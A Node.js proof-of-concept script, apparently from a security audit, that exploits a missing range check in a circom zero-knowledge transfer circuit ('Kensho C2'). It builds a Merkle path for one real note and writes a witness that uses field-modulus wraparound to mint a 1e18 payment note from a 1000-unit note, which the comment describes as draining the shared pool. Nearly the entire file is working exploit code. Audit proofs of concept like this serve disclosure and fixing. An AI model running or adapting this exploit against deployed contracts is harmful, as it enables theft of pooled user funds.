#!/usr/bin/env node
/**
 * PoC — field-overflow value inflation in transfer.circom (Kensho C2).
 *
 * The circuit's only value constraint is:  amountIn === amountPay + amountChange
 * evaluated in the BN254 scalar field (mod r). There is NO range check on the
 * amounts. So an attacker who owns ONE real note of amountIn can mint a payment
 * note of an almost-arbitrary amountPay by choosing:
 *
 *     amountChange = (r - amountPay + amountIn) mod r
 *
 * Then amountPay + amountChange ≡ amountIn (mod r) holds, the witness is valid,
 * and newCommitment0 opens (via unshield) to the inflated amountPay — draining
 * the shared pool balance.
 *
 * This script writes two witness inputs for the REAL transfer circuit:
 *   build/poc/honest-input.json     (amountIn=1000, pay=600, change=400)
 *   build/poc/inflated-input.json   (amountIn=1000, pay=1e18, change=r-1e18+1000)
 * Both reuse the same real spent note + Merkle path (membership is unaffected
 * by output amounts). If the circuit accepts the inflated one, C2 is proven.
 */
import { writeFileSync, mkdirSync } from "fs";
import { buildPoseidon } from "circomlibjs";

const DEPTH = 20;
// BN254 scalar field modulus r
const R = 21888242871839275222246405745257275088548364400416034343698204186575808495617n;

const poseidon = await buildPoseidon();
const F = poseidon.F;
const H2 = (a, b) => F.toObject(poseidon([a, b]));
const H3 = (a, b, c) => F.toObject(poseidon([a, b, c]));

const zeros = [];
{
  let z = 0n;
  for (let i = 0; i < DEPTH; i++) { zeros.push(z); z = H2(z, z); }
}

// ---- the attacker's ONE real note: they honestly shielded amountIn = 1000 ----
const asset = 0n;
const secretIn = 111111111n;
const amountIn = 1000n;
const commitmentIn = H3(secretIn, amountIn, asset);
const nullifier = H2(secretIn, commitmentIn);

// Build a small tree containing the spent note at leaf 0, compute its path.
const leaves = [commitmentIn, H3(999n, 1n, 0n), H3(888n, 2n, 0n)];
let layer = leaves.slice();
let idx = 0;
const pathElements = [];
const pathIndices = [];
for (let level = 0; level < DEPTH; level++) {
  const isRight = idx % 2 === 1;
  const siblingIdx = isRight ? idx - 1 : idx + 1;
  const sibling = (siblingIdx >= 0 && siblingIdx < layer.length) ? layer[siblingIdx] : zeros[level];
  pathElements.push(sibling);
  pathIndices.push(isRight ? 1 : 0);
  const next = [];
  for (let i = 0; i < layer.length; i += 2) {
    const left = layer[i];
    const right = i + 1 < layer.length ? layer[i + 1] : zeros[level];
    next.push(H2(left, right));
  }
  layer = next.length ? next : [zeros[level]];
  idx = Math.floor(idx / 2);
}
// root = fold the path from the leaf
let root = commitmentIn;
{
  let i2 = 0;
  for (let level = 0; level < DEPTH; level++) {
    const sib = pathElements[level];
    root = pathIndices[level] === 1 ? H2(sib, root) : H2(root, sib);
    i2++;
  }
}

function makeInput(amountPay, amountChange, secretPay, secretChange) {
  const newCommitment0 = H3(secretPay, amountPay, asset);      // payment note
  const newCommitment1 = H3(secretChange, amountChange, asset); // change note
  return {
    root: root.toString(),
    nullifier: nullifier.toString(),
    newCommitment0: newCommitment0.toString(),
    newCommitment1: newCommitment1.toString(),
    secretIn: secretIn.toString(),
    amountIn: amountIn.toString(),
    asset: asset.toString(),
    pathElements: pathElements.map(String),
    pathIndices: pathIndices.map(String),
    secretPay: secretPay.toString(),
    amountPay: amountPay.toString(),
    secretChange: secretChange.toString(),
    amountChange: amountChange.toString(),
  };
}

// Honest split: 1000 = 600 + 400
const honest = makeInput(600n, 400n, 222222222n, 333333333n);

// Inflated: mint a payment note worth 1e18 from a 1000-wei note.
const inflatedPay = 1000000000000000000n; // 1e18
const inflatedChange = (R - inflatedPay + amountIn) % R; // ≡ amountIn - inflatedPay (mod r)
const inflated = makeInput(inflatedPay, inflatedChange, 444444444n, 555555555n);

mkdirSync("build/poc", { recursive: true });
writeFileSync("build/poc/honest-input.json", JSON.stringify(honest, null, 2));
writeFileSync("build/poc/inflated-input.json", JSON.stringify(inflated, null, 2));

console.log("root            :", root.toString());
console.log("amountIn        :", amountIn.toString());
console.log("honest  pay/chg :", "600 / 400");
console.log("inflated pay    :", inflatedPay.toString(), "(1e18)");
console.log("inflated change :", inflatedChange.toString());
console.log("check: (pay+change) mod r === amountIn ?",
  ((inflatedPay + inflatedChange) % R) === amountIn);
console.log("wrote build/poc/honest-input.json, build/poc/inflated-input.json");
